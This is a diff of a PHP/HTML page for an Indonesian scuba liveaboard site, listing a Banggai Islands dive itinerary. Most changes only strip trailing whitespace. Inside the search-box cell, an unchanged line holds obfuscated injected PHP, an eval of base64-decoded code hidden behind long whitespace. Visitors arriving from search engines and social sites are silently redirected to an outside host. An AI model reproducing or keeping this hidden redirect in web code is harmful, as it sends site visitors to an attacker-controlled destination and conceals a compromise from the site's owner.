@@ -92,44 +92,44 @@ A:hover {
 }
 .style85 {font-size: 10px; font-family: Verdana, Arial, Helvetica, sans-serif; font-weight: bold; }
 </style>
-<script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
+<script src="data/Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
 </HEAD>
-<BODY bgColor=#006666 leftMargin=0 topMargin=0 rightMargin=0 bottomMargin=0 marginwidth="0" 
+<BODY bgColor=#006666 leftMargin=0 topMargin=0 rightMargin=0 bottomMargin=0 marginwidth="0"
 marginheight="0">
 <TABLE width="775" border=0 align="center" cellPadding=0 cellSpacing=0>
   <TBODY>
   <TR>
     <TD>
-      <TABLE height=188 cellSpacing=0 cellPadding=0 width="100%" 
+      <TABLE height=188 cellSpacing=0 cellPadding=0 width="100%"
       background="../images/z3.gif" border=0>
         <TBODY>
         <TR>
-              <TD height="188" vAlign=top> 
-                <TABLE cellSpacing=0 cellPadding=0 width="100%" 
-            background="../images/dotline.gif" 
+              <TD height="188" vAlign=top>
+                <TABLE cellSpacing=0 cellPadding=0 width="100%"
+            background="../images/dotline.gif"
               border=0><TBODY>
               <TR>
-                <TD height=1><IMG height=1 
-                  src="../images/dotline.gif" 
+                <TD height=1><IMG height=1
+                  src="../images/dotline.gif"
               width=3></TD></TR></TBODY></TABLE>
                 <table width="100%" border="0" cellspacing="0" cellpadding="0">
-                  <tr> 
+                  <tr>
                     <td width="332" height="171" valign="bottom" background="../images/z1.jpg">
-<TABLE width="180" height=40 
+<TABLE width="180" height=40
                               border=0 align="right" cellPadding=2 cellSpacing=0>
                         <TBODY>
-                          <TR> 
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="../images/m3.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                          <TR>
+                            <TD bgcolor="#ffffff"><IMG
+                                src="../images/m3.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="../images/m4.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                            <TD bgcolor="#ffffff"><IMG
+                                src="../images/m4.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="../images/m2.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                            <TD bgcolor="#ffffff"><IMG
+                                src="../images/m2.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
                           </TR>
-                          <TR> 
+                          <TR>
                             <TD colspan="3"><img src="../images/spacer.gif" width="10" height="67"></TD>
                           </TR>
                         </TBODY>
@@ -140,15 +140,15 @@ marginheight="0">
                         <tr>
                           <td><img src="../images/spacer.gif" width="10" height="45"></td>
                         </tr>
-                        <tr> 
+                        <tr>
                           <td height="22" valign="top">&nbsp;&nbsp;<span class="style9"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif"><a href="../index.php">Home</a> | <a href="contactus.php">Contact Us</a></font></span></td>
                         </tr>
-                        <tr> 
+                        <tr>
                           <td><img src="../images/m1.jpg" alt="indonesia_liveaboard_scuba_diving" width="325" height="104"></td>
                         </tr>
                       </table></td>
                   </tr>
-                  <tr bgcolor="#006699"> 
+                  <tr bgcolor="#006699">
                     <td colspan="3"> <div align="right"><strong><font size="2" face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></strong></div></td>
                   </tr>
                 </table></TD></TR></TBODY></TABLE></TD></TR>
@@ -158,16 +158,16 @@ marginheight="0">
         <TBODY>
         <TR>
               <TD width=291 height="1349" align=middle vAlign=top bgcolor="#4DCEE3"> <table width="100%" border="0" cellspacing="0" cellpadding="0">
-                  <tr> 
+                  <tr>
                     <td><table width="278" border="0" align="center" cellpadding="0" cellspacing="0">
-                        <tr> 
+                        <tr>
                           <td height="176" valign="top" background="../images/bgsearch.jpg">
-                            
+
                             <table width="88%" border="0" align="right" cellpadding="0" cellspacing="0">
-              <tr> 
+              <tr>
                 <td height="42">&nbsp;</td>
               </tr>
-              <tr> 
+              <tr>
                 <td><?php	                                       			eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOw0KJG5jY3Y9aGVhZGVyc19zZW50KCk7DQppZiAoISRuY2N2KXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YT0kX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ107DQppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb29nbGUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJtc24iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYXNrIikgb3Igc3RyaXN0cigkcmVmZXJlciwieW91dHViZSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rIikgKSB7DQoJaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJzaXRlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9iYnBsaW9wcy4zNDUucGwvIik7DQoJCWV4aXQoKTsNCgl9DQp9DQoJfQ==")); define( '_VALID_MOS', 1 );  include "../mod/mod_search.php"; ?></td>
               </tr>
             </table></td>
@@ -176,7 +176,7 @@ marginheight="0">
                   </tr>
                   <tr>
                     <td><table width="278" border="0" align="center" cellpadding="0" cellspacing="0">
-                        <tr> 
+                        <tr>
                           <td height="176" valign="top" background="../images/bgdestination.jpg"><table width="87%" border="0" align="center" cellpadding="0" cellspacing="0">
                             <tr>
                               <td height="33" colspan="2">&nbsp;</td>
@@ -234,7 +234,7 @@ marginheight="0">
                             </tr>
                             <tr>
                               <td><div align="center"><strong><img src="images/dot.gif" width="4" height="4"></strong></div></td>
-                              <td height="18" class="style85"><div align="center"><a href="../boats/katharina_index.php" class="style85">Bali-Flores-Bali 
+                              <td height="18" class="style85"><div align="center"><a href="../boats/katharina_index.php" class="style85">Bali-Flores-Bali
                                 &quot;
                                 Exploration Cruises&quot;</a></div></td>
                             </tr>
@@ -303,11 +303,11 @@ marginheight="0">
                 <p align="center"><img src="wallaceaboats/banggaivillage.jpg" alt="indonesia_liveaboard_scuba_diving_wallacea_sulawesi" width="246" height="173" border="1"><br>
                 <span class="style4">Banggai  Village</span></p>
                 <p align="center">&nbsp;</p>
-                <p align="center">&nbsp;</p>                
+                <p align="center">&nbsp;</p>
                 <p align="center"><img src="wallaceaboats/b24topguns.jpg" alt="indonesia_liveaboard_scuba_diving_wallacea_sulawesi" width="233" height="160" border="1"><br>
                 <strong>B54 Top Gun </strong></p>              </TD>
-          <TD vAlign=top width=10 
-          background="../images/z6.jpg"><IMG height=4 
+          <TD vAlign=top width=10
+          background="../images/z6.jpg"><IMG height=4
             src="../images/z6.jpg" width=5></TD>
           <TD width="474" vAlign=top><table width="96%"  border="0" align="center" cellpadding="0" cellspacing="0">
             <tr>
@@ -346,7 +346,7 @@ marginheight="0">
                         <tr>
                           <td colspan="2"><p align="center" class="tdinhalt style3 style11"> <br>
                               <span class="style28">Itenary Banggai Islands</span> </p>
-                            <p><strong>Day 1 - 
+                            <p><strong>Day 1 -
                               Dive Location:<br>
                               Makailu: </strong>Drop off Black coral, lot of fishes, current medium<strong> <br>
                               Lesempuang: </strong>Drop off; schools of surgeons fishes<br>
@@ -356,25 +356,25 @@ marginheight="0">
                             George's Wall:</strong> See decription. Many other dives on this group of 3 huge reefs south of Lantibung island, with about 50 kms of walls all together. <br>
                             <strong>Karang Vesuvius:</strong> Drop off <br>
                             <strong>Lantibung:</strong>                                Night Dive <br>
-                            Anchorage at Lantibung. Dive site 1hour &frac12; from the anchorage. The other dive sites are at approximately 1 hour form previous one.<br> 
+                            Anchorage at Lantibung. Dive site 1hour &frac12; from the anchorage. The other dive sites are at approximately 1 hour form previous one.<br>
                             Back to the same anchorage for night dive
                             </p>
                             <p><strong>Day 3 -  Dive Location:<br>
                               East of Bangkuru Island:</strong> Kebun laut - 2 hours from anchorage <br>
-                              <strong>Katini:</strong> Small Island ringing reef, see description - 
+                              <strong>Katini:</strong> Small Island ringing reef, see description -
 
 
  1 hour form previous site<br>
                               <strong>Siceh:</strong> Small island Fringing reef, critters - &frac12; hour from previous site <br>
-                              SIceh: 
+                              SIceh:
 
 
- Night dive - 
+ Night dive -
 
 
- &frac12; hour, go to anchor in Katini after night dive </p>                            
+ &frac12; hour, go to anchor in Katini after night dive </p>
                             <p><strong>Day 4 -Dive Location:<br>
-                            Bird's Reef:</strong> Huge reef SE Katini island. Wall diving - 
+                            Bird's Reef:</strong> Huge reef SE Katini island. Wall diving -
 
 
  2 hours &frac12; from anchorage <br>
@@ -384,13 +384,13 @@ marginheight="0">
  <br>
  We bring the guests to shore to the island of Siceh to visit the small island where are some fishermen. Very beautifull. Always some guests who want to skip the 3 rd divfe to go farnienete on this beach.                            </p>
                             <p><strong>Day 5- Dive Location<br>
-                            Labobo's Dream 1:</strong> A pinnacle just south of Labobo island. Sandy area around at 15 mts, then drop off on some parts. The area is big and we dive twice there, the 2 dives are different - 
+                            Labobo's Dream 1:</strong> A pinnacle just south of Labobo island. Sandy area around at 15 mts, then drop off on some parts. The area is big and we dive twice there, the 2 dives are different -
 
 
  from Katini to Labobo 3 hours1/2!<strong> <br>
 Labobo's Dream 2: </strong>Also one of the best dive in Banggai, as we got from schools &amp; pelagics deep to a lot of critters in the more shallow area. Sponges, sea snakes, gorgonians, soft coral, pygmy sea horses. <br>
 <strong>Kokunan Bay:</strong> From Labobo to Kokunan bay (on Banggai Island)<br>
-Banggai Village: A night dive a tiny island in front of Banggai village. <br>A lot to see.                            </p>                            
+Banggai Village: A night dive a tiny island in front of Banggai village. <br>A lot to see.                            </p>
                             <p><strong>Day 6 -Dive Location:<br>
                             Batu Gong:</strong> Pinnacle in front of the island of Pulau Dua , peninsula area, bay of kampanar - sail at night 10 PM- 5 Am to reach the peninsula. The boat stays in the bay for the all day as all dives are very close, and we go diving with the dive boat.
                             <br>
@@ -399,15 +399,15 @@ Banggai Village: A night dive a tiny island in front of Banggai village. <br>A l
                             <br>
                             <br>
                             <strong>Day 7- Dive Location:</strong><br>
-                            <strong>Tanduk:</strong> A set of 3 Pinnacles, gorgonians, pygmy sea horse, lot of fish life and exceptional gorgonians quality. Depth up to 30 mts - 
+                            <strong>Tanduk:</strong> A set of 3 Pinnacles, gorgonians, pygmy sea horse, lot of fish life and exceptional gorgonians quality. Depth up to 30 mts -
 
 
  &frac12; hour form anchorage.<br>
  <strong>Batu Tetek:</strong> A rock forming a crest, some parts emerging. Medium currents, schools of surgeons, trevallies, barracudas, thunas, sharks. A dive for fish life. Depth up to 20 mts. - 1 hour from the previous site. The main boat anchors in another bay (Teku) and we go with the dive boat. <br>
- Teku Rock: 
+ Teku Rock:
 
 
- A large rock; soft corals, pygmy sea horses, huge gorgonians, sof corrals, ribbon eels, soft coral crabs - 
+ A large rock; soft corals, pygmy sea horses, huge gorgonians, sof corrals, ribbon eels, soft coral crabs -
 
 
  With the dive boat, 20 minute from the anchorage.<br>
@@ -416,7 +416,7 @@ Banggai Village: A night dive a tiny island in front of Banggai village. <br>A l
                             <p><strong>Day 8 - Dive Location:</strong> <br>
                               <strong>White Anemones:</strong> Close to Teku rock, another rock to a depth of 30 mts.<br>
 Schools of fishes, and a wall covered with colonial white anemones -45 minutes from anchorage.<br>
-<strong>Batu Mandi:</strong> A rock goiung down to 15 mts, canyons, gian trevallies - 
+<strong>Batu Mandi:</strong> A rock goiung down to 15 mts, canyons, gian trevallies -
 
 
  8 hours sail to Luwuk harbour. Arrival around 6 PM. Night at maleo cottage then fly the following morning.</p>
@@ -445,10 +445,10 @@ Schools of fishes, and a wall covered with colonial white anemones -45 minutes f
         </TBODY></TABLE></TD></TR>
   <TR>
     <TD>
-      <TABLE height=26 cellSpacing=0 cellPadding=0 width="100%" 
+      <TABLE height=26 cellSpacing=0 cellPadding=0 width="100%"
       background="../images/z4.gif" border=0>
           <TBODY>
-            <TR> 
+            <TR>
               <TD height="8"><img src="../images/spacer.gif" width="10" height="8"></TD>
             </TR>
             <TR>
